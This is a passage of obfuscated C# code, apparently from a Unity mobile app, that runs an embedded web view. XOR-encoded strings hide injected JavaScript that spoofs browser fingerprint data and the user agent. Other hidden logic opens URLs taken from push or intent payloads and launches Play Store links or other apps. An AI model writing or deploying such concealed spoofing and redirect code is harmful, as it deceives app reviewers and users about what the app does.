            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x96e02e0a._0x40b5567f(new byte[28] { 236, 253, 235, 236, 152, 235, 209, 223, 214, 149, 209, 214, 152, 234, 221, 201, 205, 221, 203, 204, 152, 253, 234, 234, 247, 234, 130, 152 }, 184) + ex.Message);
#endif
                }

                _0x979cb192?._0x52176c73();
                return true;
            }
        }
        while (!_0xe593414d);
        return false;
    }

    private string _0x65542f71 = "";
    private void WLog(string _0x25d8a619)
    {
#if B_LOGS
        {
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[7] { 52, 59, 10, 28, 27, 50, 79 }, 111) + _0x25d8a619);
        }
#endif
    }

    private string _0x30e61770()
    {
        string _0xd61dc976 = _0xa0d30070();
        if (string.IsNullOrEmpty(_0xd61dc976))
            return _0x96e02e0a._0x40b5567f(new byte[7] { 34, 59, 61, 48, 116, 100, 111 }, 84);
        string _0x1b34a984 = _0xd61dc976.Replace(_0x96e02e0a._0x40b5567f(new byte[1] { 184 }, 228), _0x96e02e0a._0x40b5567f(new byte[2] { 22, 22 }, 74)).Replace(_0x96e02e0a._0x40b5567f(new byte[1] { 170 }, 141), _0x96e02e0a._0x40b5567f(new byte[2] { 207, 180 }, 147));
        var _0xd492be36 = Regex.Match(_0xd61dc976, _0x96e02e0a._0x40b5567f(new byte[12] { 26, 49, 43, 54, 52, 60, 118, 113, 5, 61, 114, 112 }, 89));
        string _0x1fc92cc4 = _0xd492be36.Success ? _0xd492be36.Groups[1].Value : _0x96e02e0a._0x40b5567f(new byte[3] { 110, 109, 111 }, 95);
        return _0x96e02e0a._0x40b5567f(new byte[12] { 25, 87, 68, 95, 82, 69, 88, 94, 95, 25, 24, 74 }, 49) + _0x96e02e0a._0x40b5567f(new byte[8] { 253, 234, 249, 171, 254, 234, 182, 172 }, 139) + _0x1b34a984 + _0x96e02e0a._0x40b5567f(new byte[2] { 177, 173 }, 150) + _0x96e02e0a._0x40b5567f(new byte[30] { 58, 45, 62, 108, 60, 62, 35, 56, 35, 113, 2, 45, 58, 37, 43, 45, 56, 35, 62, 98, 60, 62, 35, 56, 35, 56, 53, 60, 41, 119 }, 76) + _0x96e02e0a._0x40b5567f(new byte[121] { 50, 33, 58, 55, 32, 61, 59, 58, 116, 48, 49, 50, 124, 59, 54, 62, 120, 63, 49, 45, 120, 34, 53, 56, 125, 47, 32, 38, 45, 47, 27, 54, 62, 49, 55, 32, 122, 48, 49, 50, 61, 58, 49, 4, 38, 59, 36, 49, 38, 32, 45, 124, 59, 54, 62, 120, 63, 49, 45, 120, 47, 51, 49, 32, 110, 50, 33, 58, 55, 32, 61, 59, 58, 124, 125, 47, 38, 49, 32, 33, 38, 58, 116, 34, 53, 56, 111, 41, 120, 55, 59, 58, 50, 61, 51, 33, 38, 53, 54, 56, 49, 110, 32, 38, 33, 49, 41, 125, 111, 41, 55, 53, 32, 55, 60, 124, 49, 125, 47, 41, 41 }, 84) + _0x96e02e0a._0x40b5567f(new byte[26] { 25, 24, 27, 85, 13, 15, 18, 9, 18, 81, 90, 8, 14, 24, 15, 60, 26, 24, 19, 9, 90, 81, 8, 28, 84, 70 }, 125) + _0x96e02e0a._0x40b5567f(new byte[52] { 148, 149, 150, 216, 128, 130, 159, 132, 159, 220, 215, 145, 128, 128, 166, 149, 130, 131, 153, 159, 158, 215, 220, 133, 145, 222, 130, 149, 128, 156, 145, 147, 149, 216, 223, 174, 189, 159, 138, 153, 156, 156, 145, 172, 223, 223, 220, 215, 215, 217, 217, 203 }, 240) + _0x96e02e0a._0x40b5567f(new byte[37] { 112, 113, 114, 60, 100, 102, 123, 96, 123, 56, 51, 100, 120, 117, 96, 114, 123, 102, 121, 51, 56, 51, 88, 125, 122, 97, 108, 52, 117, 102, 121, 98, 44, 120, 51, 61, 47 }, 20) + _0x96e02e0a._0x40b5567f(new byte[34] { 220, 221, 222, 144, 200, 202, 215, 204, 215, 148, 159, 206, 221, 214, 220, 215, 202, 159, 148, 159, 255, 215, 215, 223, 212, 221, 152, 241, 214, 219, 150, 159, 145, 131 }, 184) + _0x96e02e0a._0x40b5567f(new byte[30] { 252, 253, 254, 176, 232, 234, 247, 236, 247, 180, 191, 245, 249, 224, 204, 247, 237, 251, 240, 200, 247, 241, 246, 236, 235, 191, 180, 173, 177, 163 }, 152) + _0x96e02e0a._0x40b5567f(new byte[48] { 90, 92, 87, 85, 88, 79, 92, 14, 91, 79, 74, 19, 85, 76, 92, 79, 64, 74, 93, 20, 117, 85, 76, 92, 79, 64, 74, 20, 9, 109, 70, 92, 65, 67, 71, 91, 67, 9, 2, 88, 75, 92, 93, 71, 65, 64, 20, 9 }, 46) + _0x1fc92cc4 + _0x96e02e0a._0x40b5567f(new byte[35] { 232, 178, 227, 180, 173, 189, 174, 161, 171, 245, 232, 136, 160, 160, 168, 163, 170, 239, 140, 167, 189, 160, 162, 170, 232, 227, 185, 170, 189, 188, 166, 160, 161, 245, 232 }, 207) + _0x1fc92cc4 + _0x96e02e0a._0x40b5567f(new byte[238] { 132, 222, 143, 216, 193, 209, 194, 205, 199, 153, 132, 237, 204, 215, 158, 226, 156, 225, 209, 194, 205, 199, 132, 143, 213, 198, 209, 208, 202, 204, 205, 153, 132, 145, 151, 132, 222, 254, 143, 206, 204, 193, 202, 207, 198, 153, 215, 209, 214, 198, 143, 211, 207, 194, 215, 197, 204, 209, 206, 153, 132, 226, 205, 199, 209, 204, 202, 199, 132, 143, 196, 198, 215, 235, 202, 196, 203, 230, 205, 215, 209, 204, 211, 218, 245, 194, 207, 214, 198, 208, 153, 197, 214, 205, 192, 215, 202, 204, 205, 139, 138, 216, 209, 198, 215, 214, 209, 205, 131, 243, 209, 204, 206, 202, 208, 198, 141, 209, 198, 208, 204, 207, 213, 198, 139, 216, 194, 209, 192, 203, 202, 215, 198, 192, 215, 214, 209, 198, 153, 132, 194, 209, 206, 132, 143, 193, 202, 215, 205, 198, 208, 208, 153, 132, 149, 151, 132, 143, 206, 204, 193, 202, 207, 198, 153, 215, 209, 214, 198, 143, 206, 204, 199, 198, 207, 153, 132, 132, 143, 211, 207, 194, 215, 197, 204, 209, 206, 153, 132, 226, 205, 199, 209, 204, 202, 199, 132, 143, 211, 207, 194, 215, 197, 204, 209, 206, 245, 198, 209, 208, 202, 204, 205, 153, 132, 146, 151, 141, 147, 141, 147, 132, 143, 214, 194, 229, 214, 207, 207, 245, 198, 209, 208, 202, 204, 205, 153, 132 }, 163) + _0x1fc92cc4 + _0x96e02e0a._0x40b5567f(new byte[117] { 162, 188, 162, 188, 162, 188, 171, 241, 165, 183, 241, 241, 183, 195, 238, 230, 233, 239, 248, 162, 232, 233, 234, 229, 226, 233, 220, 254, 227, 252, 233, 254, 248, 245, 164, 252, 254, 227, 248, 227, 160, 171, 249, 255, 233, 254, 205, 235, 233, 226, 248, 200, 237, 248, 237, 171, 160, 247, 235, 233, 248, 182, 234, 249, 226, 239, 248, 229, 227, 226, 164, 165, 247, 254, 233, 248, 249, 254, 226, 172, 249, 237, 232, 183, 241, 160, 239, 227, 226, 234, 229, 235, 249, 254, 237, 238, 224, 233, 182, 248, 254, 249, 233, 241, 165, 183, 241, 239, 237, 248, 239, 228, 164, 233, 165, 247, 241 }, 140) + _0x96e02e0a._0x40b5567f(new byte[5] { 100, 48, 49, 48, 34 }, 25);
    }

    private bool _0x793ea5be = false;
    private readonly List<UniWebViewPopup> _0x81ab6676 = new List<UniWebViewPopup>();
    private Text _0x4a8e1644;
    internal void _0x7273e4d1()
    {
        Rect _0xabb22f12 = Screen.safeArea;
        Vector2 _0xc4146323 = new Vector2(Screen.width, Screen.height);
        if (_0xabb22f12 == lastSafe && _0xc4146323 == lastSize)
            return;
        // Apply manual padding
        _0xabb22f12.xMin += _0xa7041f34;
        _0xabb22f12.xMax -= _0xac07147d;
        _0xabb22f12.yMin += _0x7f45bfd3;
        _0xabb22f12.yMax -= _0x80430122;
        // Convert Unity safe area -> native WebView frame
        Rect _0x046cb972 = new Rect(_0xabb22f12.x, _0xc4146323.y - _0xabb22f12.y - _0xabb22f12.height, // Y flip for native coordinate system
 _0xabb22f12.width, _0xabb22f12.height);
        _0xf17178f5.Frame = _0x046cb972;
        lastSafe = Screen.safeArea;
        lastSize = _0xc4146323;
    }

    private string _0xe7b0fa00 { get; set; }

    private string _0xf5ee8a3d = "";
    // WEB VIEW LOGIC
    public bool _0x6ab25542 { get; set; }

    private void _0x4d262dd3()
    {
        if (_0x3001f316 != null)
            return;
        var _0x41d2bc7c = _0xee19c31e();
        _0x3001f316 = new GameObject(_0x96e02e0a._0x40b5567f(new byte[14] { 17, 35, 36, 16, 47, 35, 49, 21, 54, 47, 40, 40, 35, 52 }, 70), typeof(RectTransform), typeof(Text));
        _0xfd43c7b3 = _0x3001f316.GetComponent<RectTransform>();
        _0xfd43c7b3.SetParent(_0x41d2bc7c.transform, false);
        _0xfd43c7b3.anchorMin = new Vector2(0.5f, 0.5f);
        _0xfd43c7b3.anchorMax = new Vector2(0.5f, 0.5f);
        _0xfd43c7b3.pivot = new Vector2(0.5f, 0.5f);
        _0xfd43c7b3.sizeDelta = new Vector2(600f, 600f);
        _0xfd43c7b3.anchoredPosition = Vector2.zero;
        _0x4a8e1644 = _0x3001f316.GetComponent<Text>();
        _0x4a8e1644.text = _0x96e02e0a._0x40b5567f(new byte[1] { 102 }, 73);
        _0x4a8e1644.font = Resources.GetBuiltinResource<Font>(_0x96e02e0a._0x40b5567f(new byte[17] { 96, 73, 75, 77, 79, 85, 126, 89, 66, 88, 69, 65, 73, 2, 88, 88, 74 }, 44));
        _0x4a8e1644.fontSize = 200;
        _0x4a8e1644.alignment = TextAnchor.MiddleCenter;
        _0x4a8e1644.color = Color.white;
        _0x4a8e1644.raycastTarget = false;
        _0x3001f316.SetActive(false);
    }

    private string _0xb30c3601 = "";
    private bool _0xf7ad7f69(string _0x9eec2f87)
    {
        if (string.IsNullOrEmpty(_0x9eec2f87))
            return false;
        try
        {
            using (var _0x1805b573 = new AndroidJavaClass(_0x96e02e0a._0x40b5567f(new byte[30] { 0, 12, 14, 77, 22, 13, 10, 23, 26, 80, 7, 77, 19, 15, 2, 26, 6, 17, 77, 54, 13, 10, 23, 26, 51, 15, 2, 26, 6, 17 }, 99)))
            using (var _0x35b3957d = _0x1805b573.GetStatic<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[15] { 195, 213, 210, 210, 197, 206, 212, 225, 195, 212, 201, 214, 201, 212, 217 }, 160)))
            using (var _0x12c81af7 = _0x35b3957d.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[17] { 182, 180, 165, 129, 176, 178, 186, 176, 182, 180, 156, 176, 191, 176, 182, 180, 163 }, 209)))
            using (var _0x175b5340 = _0x12c81af7.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[25] { 154, 152, 137, 177, 156, 136, 147, 158, 149, 180, 147, 137, 152, 147, 137, 187, 146, 143, 173, 156, 158, 150, 156, 154, 152 }, 253), _0x9eec2f87))
            {
                if (_0x175b5340 == null)
                    return false;
                WLog(_0x96e02e0a._0x40b5567f(new byte[37] { 125, 86, 76, 81, 83, 91, 114, 87, 85, 91, 30, 82, 95, 75, 80, 93, 86, 30, 87, 80, 77, 74, 95, 82, 82, 91, 90, 30, 78, 95, 93, 85, 95, 89, 91, 4, 30 }, 62) + _0x9eec2f87);
                _0x175b5340.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[8] { 252, 249, 249, 219, 241, 252, 250, 238 }, 157), 0x10000000);
                _0x35b3957d.Call(_0x96e02e0a._0x40b5567f(new byte[13] { 221, 218, 207, 220, 218, 239, 205, 218, 199, 216, 199, 218, 215 }, 174), _0x175b5340);
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private void _0x28e1108f()
    {
        _0x1028a85a = true;
        if (_0xf17178f5 != null)
            _0xf17178f5.SetUserAgent(_0xa0d30070());
    }

    private void _0x55bad334(UniWebView _0xe6881809)
    {
        _0xe6881809.BackgroundColor = Color.clear;
        _0xe6881809.SetSupportMultipleWindows(true, true);
        _0xe6881809.SetBackButtonEnabled(false);
        _0xf17178f5.SetUserAgent(_0xa0d30070());
    }

    private string _0x896cb845;
    public void _0x52176c73()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[18] { 116, 123, 74, 92, 91, 114, 15, 99, 78, 90, 65, 76, 71, 15, 104, 78, 66, 74 }, 47));
#endif
        }

        _0x31ad5810.Instance?._0xc5b81a8a();
        _0x146cc450.Instance._0x52c81cdc(_0x7a51889f._0x072f746b.DEFAULT);
    }

    private bool _0x68255702()
    {
        _0x81ab6676.RemoveAll(_0x432fc95e => _0x432fc95e == null || !_0x432fc95e.IsAlive);
        return _0x81ab6676.Count > 0;
    }

    internal bool _0x9e0238d1(string _0xbf6f1052)
    {
        return _0xbf6f1052.StartsWith(_0x96e02e0a._0x40b5567f(new byte[9] { 32, 44, 63, 38, 40, 57, 119, 98, 98 }, 77), StringComparison.OrdinalIgnoreCase) || _0xbf6f1052.StartsWith(_0x96e02e0a._0x40b5567f(new byte[24] { 208, 204, 204, 200, 203, 130, 151, 151, 200, 212, 217, 193, 150, 223, 215, 215, 223, 212, 221, 150, 219, 215, 213, 151 }, 184), StringComparison.OrdinalIgnoreCase) || _0xbf6f1052.StartsWith(_0x96e02e0a._0x40b5567f(new byte[23] { 137, 149, 149, 145, 219, 206, 206, 145, 141, 128, 152, 207, 134, 142, 142, 134, 141, 132, 207, 130, 142, 140, 206 }, 225), StringComparison.OrdinalIgnoreCase);
    }

    private GameObject _0x3001f316;
    private string _0x30c8a0b7()
    {
        string _0x914d7968 = _0x96e02e0a._0x40b5567f(new byte[62] { 220, 223, 222, 217, 216, 219, 218, 213, 212, 215, 214, 209, 208, 211, 210, 205, 204, 207, 206, 201, 200, 203, 202, 197, 196, 199, 252, 255, 254, 249, 248, 251, 250, 245, 244, 247, 246, 241, 240, 243, 242, 237, 236, 239, 238, 233, 232, 235, 234, 229, 228, 231, 141, 140, 143, 142, 137, 136, 139, 138, 133, 132 }, 189);
        System.Random _0xdf60107e = new System.Random();
        int _0x409b7d3b = _0xdf60107e.Next(8, 16);
        return new string (Enumerable.Repeat(_0x914d7968, _0x409b7d3b).Select(_0xf6ac7101 => _0xf6ac7101[_0xdf60107e.Next(_0xf6ac7101.Length)]).ToArray());
    }

    private void _0x1144587b()
    {
        using (var _0x6216c514 = new AndroidJavaClass(_0x96e02e0a._0x40b5567f(new byte[30] { 232, 228, 230, 165, 254, 229, 226, 255, 242, 184, 239, 165, 251, 231, 234, 242, 238, 249, 165, 222, 229, 226, 255, 242, 219, 231, 234, 242, 238, 249 }, 139)))
        using (var _0xd6b20619 = _0x6216c514.GetStatic<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[15] { 177, 167, 160, 160, 183, 188, 166, 147, 177, 166, 187, 164, 187, 166, 171 }, 210)))
        using (var _0x0e2372e3 = _0xd6b20619.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[9] { 84, 86, 71, 122, 93, 71, 86, 93, 71 }, 51)))
        {
            if (_0x0e2372e3 == null)
                return;
            using (var _0x46dbc0e2 = _0x0e2372e3.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[9] { 208, 210, 195, 242, 207, 195, 197, 214, 196 }, 183)))
            {
                if (_0x46dbc0e2 == null)
                    return;
                using (var _0x2956583d = new AndroidJavaObject(_0x96e02e0a._0x40b5567f(new byte[19] { 7, 26, 15, 70, 2, 27, 7, 6, 70, 34, 59, 39, 38, 39, 10, 2, 13, 11, 28 }, 104)))
                using (var _0x9e6656a4 = _0x46dbc0e2.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[6] { 243, 253, 225, 203, 253, 236 }, 152)))
                using (var _0xa4e1fdee = _0x9e6656a4.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[8] { 142, 147, 130, 149, 134, 147, 136, 149 }, 231)))
                {
                    while (_0xa4e1fdee.Call<bool>(_0x96e02e0a._0x40b5567f(new byte[7] { 59, 50, 32, 29, 54, 43, 39 }, 83)))
                    {
                        string _0xd8c00028 = _0xa4e1fdee.Call<string>(_0x96e02e0a._0x40b5567f(new byte[4] { 18, 25, 4, 8 }, 124));
                        using (var _0x2291b5d2 = _0x46dbc0e2.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[3] { 225, 227, 242 }, 134), _0xd8c00028))
                        {
                            _0x2956583d.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[3] { 128, 133, 132 }, 240), _0xd8c00028, _0x2291b5d2);
                        }
                    }

                    string _0x4d336078 = _0x2956583d.Call<string>(_0x96e02e0a._0x40b5567f(new byte[8] { 80, 75, 119, 80, 86, 77, 74, 67 }, 36));
                    if (!string.IsNullOrEmpty(_0x4d336078))
                    {
                        _0x989e978b(_0x4d336078);
                        _0x14f74123(_0x4d336078);
                    }
                }
            }
        }
    }

    private string _0x37c0f024()
    {
        return _0x96e02e0a._0x40b5567f(new byte[12] { 236, 162, 177, 170, 167, 176, 173, 171, 170, 236, 237, 191 }, 196) + _0x96e02e0a._0x40b5567f(new byte[8] { 189, 170, 185, 235, 190, 170, 246, 236 }, 203) + WindowsDesktopUserAgent + _0x96e02e0a._0x40b5567f(new byte[2] { 189, 161 }, 154) + _0x96e02e0a._0x40b5567f(new byte[30] { 110, 121, 106, 56, 104, 106, 119, 108, 119, 37, 86, 121, 110, 113, 127, 121, 108, 119, 106, 54, 104, 106, 119, 108, 119, 108, 97, 104, 125, 35 }, 24) + _0x96e02e0a._0x40b5567f(new byte[121] { 115, 96, 123, 118, 97, 124, 122, 123, 53, 113, 112, 115, 61, 122, 119, 127, 57, 126, 112, 108, 57, 99, 116, 121, 60, 110, 97, 103, 108, 110, 90, 119, 127, 112, 118, 97, 59, 113, 112, 115, 124, 123, 112, 69, 103, 122, 101, 112, 103, 97, 108, 61, 122, 119, 127, 57, 126, 112, 108, 57, 110, 114, 112, 97, 47, 115, 96, 123, 118, 97, 124, 122, 123, 61, 60, 110, 103, 112, 97, 96, 103, 123, 53, 99, 116, 121, 46, 104, 57, 118, 122, 123, 115, 124, 114, 96, 103, 116, 119, 121, 112, 47, 97, 103, 96, 112, 104, 60, 46, 104, 118, 116, 97, 118, 125, 61, 112, 60, 110, 104, 104 }, 21) + _0x96e02e0a._0x40b5567f(new byte[26] { 134, 135, 132, 202, 146, 144, 141, 150, 141, 206, 197, 151, 145, 135, 144, 163, 133, 135, 140, 150, 197, 206, 151, 131, 203, 217 }, 226) + _0x96e02e0a._0x40b5567f(new byte[130] { 95, 94, 93, 19, 75, 73, 84, 79, 84, 23, 28, 90, 75, 75, 109, 94, 73, 72, 82, 84, 85, 28, 23, 28, 14, 21, 11, 27, 19, 108, 82, 85, 95, 84, 76, 72, 27, 117, 111, 27, 10, 11, 21, 11, 0, 27, 108, 82, 85, 13, 15, 0, 27, 67, 13, 15, 18, 27, 122, 75, 75, 87, 94, 108, 94, 89, 112, 82, 79, 20, 14, 8, 12, 21, 8, 13, 27, 19, 112, 115, 111, 118, 119, 23, 27, 87, 82, 80, 94, 27, 124, 94, 88, 80, 84, 18, 27, 120, 83, 73, 84, 86, 94, 20, 10, 9, 11, 21, 11, 21, 11, 21, 11, 27, 104, 90, 93, 90, 73, 82, 20, 14, 8, 12, 21, 8, 13, 28, 18, 0 }, 59) + _0x96e02e0a._0x40b5567f(new byte[30] { 250, 251, 248, 182, 238, 236, 241, 234, 241, 178, 185, 238, 242, 255, 234, 248, 241, 236, 243, 185, 178, 185, 201, 247, 240, 173, 172, 185, 183, 165 }, 158) + _0x96e02e0a._0x40b5567f(new byte[34] { 102, 103, 100, 42, 114, 112, 109, 118, 109, 46, 37, 116, 103, 108, 102, 109, 112, 37, 46, 37, 69, 109, 109, 101, 110, 103, 34, 75, 108, 97, 44, 37, 43, 57 }, 2) + _0x96e02e0a._0x40b5567f(new byte[30] { 6, 7, 4, 74, 18, 16, 13, 22, 13, 78, 69, 15, 3, 26, 54, 13, 23, 1, 10, 50, 13, 11, 12, 22, 17, 69, 78, 82, 75, 89 }, 98) + _0x96e02e0a._0x40b5567f(new byte[449] { 68, 66, 73, 75, 70, 81, 66, 16, 69, 81, 84, 13, 75, 82, 66, 81, 94, 84, 67, 10, 107, 75, 82, 66, 81, 94, 84, 10, 23, 115, 88, 66, 95, 93, 89, 69, 93, 23, 28, 70, 85, 66, 67, 89, 95, 94, 10, 23, 1, 2, 0, 23, 77, 28, 75, 82, 66, 81, 94, 84, 10, 23, 119, 95, 95, 87, 92, 85, 16, 115, 88, 66, 95, 93, 85, 23, 28, 70, 85, 66, 67, 89, 95, 94, 10, 23, 1, 2, 0, 23, 77, 28, 75, 82, 66, 81, 94, 84, 10, 23, 126, 95, 68, 13, 113, 15, 114, 66, 81, 94, 84, 23, 28, 70, 85, 66, 67, 89, 95, 94, 10, 23, 2, 4, 23, 77, 109, 28, 93, 95, 82, 89, 92, 85, 10, 86, 81, 92, 67, 85, 28, 64, 92, 81, 68, 86, 95, 66, 93, 10, 23, 103, 89, 94, 84, 95, 71, 67, 23, 28, 87, 85, 68, 120, 89, 87, 88, 117, 94, 68, 66, 95, 64, 73, 102, 81, 92, 69, 85, 67, 10, 86, 69, 94, 83, 68, 89, 95, 94, 24, 25, 75, 66, 85, 68, 69, 66, 94, 16, 96, 66, 95, 93, 89, 67, 85, 30, 66, 85, 67, 95, 92, 70, 85, 24, 75, 81, 66, 83, 88, 89, 68, 85, 83, 68, 69, 66, 85, 10, 23, 72, 8, 6, 23, 28, 82, 89, 68, 94, 85, 67, 67, 10, 23, 6, 4, 23, 28, 93, 95, 82, 89, 92, 85, 10, 86, 81, 92, 67, 85, 28, 93, 95, 84, 85, 92, 10, 23, 23, 28, 64, 92, 81, 68, 86, 95, 66, 93, 10, 23, 103, 89, 94, 84, 95, 71, 67, 23, 28, 64, 92, 81, 68, 86, 95, 66, 93, 102, 85, 66, 67, 89, 95, 94, 10, 23, 1, 5, 30, 0, 30, 0, 23, 28, 69, 81, 118, 69, 92, 92, 102, 85, 66, 67, 89, 95, 94, 10, 23, 1, 2, 0, 30, 0, 30, 0, 30, 0, 23, 77, 25, 11, 77, 77, 11, 127, 82, 90, 85, 83, 68, 30, 84, 85, 86, 89, 94, 85, 96, 66, 95, 64, 85, 66, 68, 73, 24, 64, 66, 95, 68, 95, 28, 23, 69, 67, 85, 66, 113, 87, 85, 94, 68, 116, 81, 68, 81, 23, 28, 75, 87, 85, 68, 10, 86, 69, 94, 83, 68, 89, 95, 94, 24, 25, 75, 66, 85, 68, 69, 66, 94, 16, 69, 81, 84, 11, 77, 28, 83, 95, 94, 86, 89, 87, 69, 66, 81, 82, 92, 85, 10, 68, 66, 69, 85, 77, 25, 11, 77, 83, 81, 68, 83, 88, 24, 85, 25, 75, 77 }, 48) + _0x96e02e0a._0x40b5567f(new byte[112] { 211, 210, 209, 159, 196, 212, 197, 210, 210, 217, 155, 144, 192, 222, 211, 195, 223, 144, 155, 134, 142, 133, 135, 158, 140, 211, 210, 209, 159, 196, 212, 197, 210, 210, 217, 155, 144, 223, 210, 222, 208, 223, 195, 144, 155, 134, 135, 143, 135, 158, 140, 211, 210, 209, 159, 196, 212, 197, 210, 210, 217, 155, 144, 214, 193, 214, 222, 219, 224, 222, 211, 195, 223, 144, 155, 134, 142, 133, 135, 158, 140, 211, 210, 209, 159, 196, 212, 197, 210, 210, 217, 155, 144, 214, 193, 214, 222, 219, 255, 210, 222, 208, 223, 195, 144, 155, 134, 135, 131, 135, 158, 140 }, 183) + _0x96e02e0a._0x40b5567f(new byte[45] { 249, 255, 244, 246, 250, 228, 227, 233, 226, 250, 163, 226, 227, 249, 226, 248, 238, 229, 254, 249, 236, 255, 249, 176, 248, 227, 233, 232, 235, 228, 227, 232, 233, 182, 240, 238, 236, 249, 238, 229, 165, 232, 164, 246, 240 }, 141) + _0x96e02e0a._0x40b5567f(new byte[721] { 70, 64, 75, 73, 68, 83, 64, 18, 93, 64, 91, 85, 15, 69, 91, 92, 86, 93, 69, 28, 95, 83, 70, 81, 90, 127, 87, 86, 91, 83, 28, 80, 91, 92, 86, 26, 69, 91, 92, 86, 93, 69, 27, 9, 69, 91, 92, 86, 93, 69, 28, 95, 83, 70, 81, 90, 127, 87, 86, 91, 83, 15, 84, 71, 92, 81, 70, 91, 93, 92, 26, 67, 27, 73, 68, 83, 64, 18, 65, 15, 97, 70, 64, 91, 92, 85, 26, 67, 27, 28, 70, 93, 126, 93, 69, 87, 64, 113, 83, 65, 87, 26, 27, 9, 91, 84, 26, 65, 28, 91, 92, 86, 87, 74, 125, 84, 26, 21, 66, 93, 91, 92, 70, 87, 64, 8, 18, 81, 93, 83, 64, 65, 87, 21, 27, 12, 15, 2, 78, 78, 65, 28, 91, 92, 86, 87, 74, 125, 84, 26, 21, 90, 93, 68, 87, 64, 8, 18, 92, 93, 92, 87, 21, 27, 12, 15, 2, 78, 78, 65, 28, 91, 92, 86, 87, 74, 125, 84, 26, 21, 95, 83, 74, 31, 69, 91, 86, 70, 90, 21, 27, 12, 15, 2, 78, 78, 65, 28, 91, 92, 86, 87, 74, 125, 84, 26, 21, 95, 83, 74, 31, 86, 87, 68, 91, 81, 87, 31, 69, 91, 86, 70, 90, 21, 27, 12, 15, 2, 27, 64, 87, 70, 71, 64, 92, 18, 73, 95, 83, 70, 81, 90, 87, 65, 8, 84, 83, 94, 65, 87, 30, 95, 87, 86, 91, 83, 8, 67, 30, 93, 92, 81, 90, 83, 92, 85, 87, 8, 92, 71, 94, 94, 30, 83, 86, 86, 126, 91, 65, 70, 87, 92, 87, 64, 8, 84, 71, 92, 81, 70, 91, 93, 92, 26, 27, 73, 79, 30, 64, 87, 95, 93, 68, 87, 126, 91, 65, 70, 87, 92, 87, 64, 8, 84, 71, 92, 81, 70, 91, 93, 92, 26, 27, 73, 79, 30, 83, 86, 86, 119, 68, 87, 92, 70, 126, 91, 65, 70, 87, 92, 87, 64, 8, 84, 71, 92, 81, 70, 91, 93, 92, 26, 27, 73, 79, 30, 64, 87, 95, 93, 68, 87, 119, 68, 87, 92, 70, 126, 91, 65, 70, 87, 92, 87, 64, 8, 84, 71, 92, 81, 70, 91, 93, 92, 26, 27, 73, 79, 30, 86, 91, 65, 66, 83, 70, 81, 90, 119, 68, 87, 92, 70, 8, 84, 71, 92, 81, 70, 91, 93, 92, 26, 27, 73, 64, 87, 70, 71, 64, 92, 18, 84, 83, 94, 65, 87, 9, 79, 79, 9, 91, 84, 26, 65, 28, 91, 92, 86, 87, 74, 125, 84, 26, 21, 66, 93, 91, 92, 70, 87, 64, 8, 18, 84, 91, 92, 87, 21, 27, 12, 15, 2, 78, 78, 65, 28, 91, 92, 86, 87, 74, 125, 84, 26, 21, 90, 93, 68, 87, 64, 8, 18, 90, 93, 68, 87, 64, 21, 27, 12, 15, 2, 27, 64, 87, 70, 71, 64, 92, 18, 73, 95, 83, 70, 81, 90, 87, 65, 8, 70, 64, 71, 87, 30, 95, 87, 86, 91, 83, 8, 67, 30, 93, 92, 81, 90, 83, 92, 85, 87, 8, 92, 71, 94, 94, 30, 83, 86, 86, 126, 91, 65, 70, 87, 92, 87, 64, 8, 84, 71, 92, 81, 70, 91, 93, 92, 26, 27, 73, 79, 30, 64, 87, 95, 93, 68, 87, 126, 91, 65, 70, 87, 92, 87, 64, 8, 84, 71, 92, 81, 70, 91, 93, 92, 26, 27, 73, 79, 30, 83, 86, 86, 119, 68, 87, 92, 70, 126, 91, 65, 70, 87, 92, 87, 64, 8, 84, 71, 92, 81, 70, 91, 93, 92, 26, 27, 73, 79, 30, 64, 87, 95, 93, 68, 87, 119, 68, 87, 92, 70, 126, 91, 65, 70, 87, 92, 87, 64, 8, 84, 71, 92, 81, 70, 91, 93, 92, 26, 27, 73, 79, 30, 86, 91, 65, 66, 83, 70, 81, 90, 119, 68, 87, 92, 70, 8, 84, 71, 92, 81, 70, 91, 93, 92, 26, 27, 73, 64, 87, 70, 71, 64, 92, 18, 84, 83, 94, 65, 87, 9, 79, 79, 9, 64, 87, 70, 71, 64, 92, 18, 93, 64, 91, 85, 26, 67, 27, 9, 79, 9, 79, 81, 83, 70, 81, 90, 26, 87, 27, 73, 79 }, 50) + _0x96e02e0a._0x40b5567f(new byte[5] { 48, 100, 101, 100, 118 }, 77);
    }

    private void OnDestroy()
    {
        StopAllCoroutines();
        _0x52176c73();
    }

    private string _0x0796227a = "";
    private void _0x989e978b(string _0x9d745dd9)
    {
        Dictionary<string, object> _0xa2c89a53;
        try
        {
            _0xa2c89a53 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x9d745dd9);
        }
        catch
        {
            return;
        }

        var _0xd7083f6e = ReadPushField(_0xa2c89a53, _0x96e02e0a._0x40b5567f(new byte[3] { 130, 133, 155 }, 247));
        if (string.IsNullOrWhiteSpace(_0xd7083f6e))
            return;
        _0xd7083f6e = _0xd7083f6e.Trim();
        if (!IsHttpUrl(_0xd7083f6e))
            return;
        if (string.Equals(_0xd7083f6e, _0x896cb845, StringComparison.Ordinal))
            return;
        _0x896cb845 = _0xd7083f6e;
        OpenUrlExternally(_0xd7083f6e);
    }

    private async Task _0x908a36d1()
    {
        if (await _0x147d42d4())
            return;
        if (await _0xc53e979b())
            return;
        if (await _0x8044514f())
            return;
        _0x54a2c5ee();
        await _0xc74416c0(_0xc2474efb());
        _0xdee17bb5 = await _0x3e40cbfc();
        await _0x4c314f12();
    }

    private void _0x14f74123(string _0xc6b06a39)
    {
        {
            {
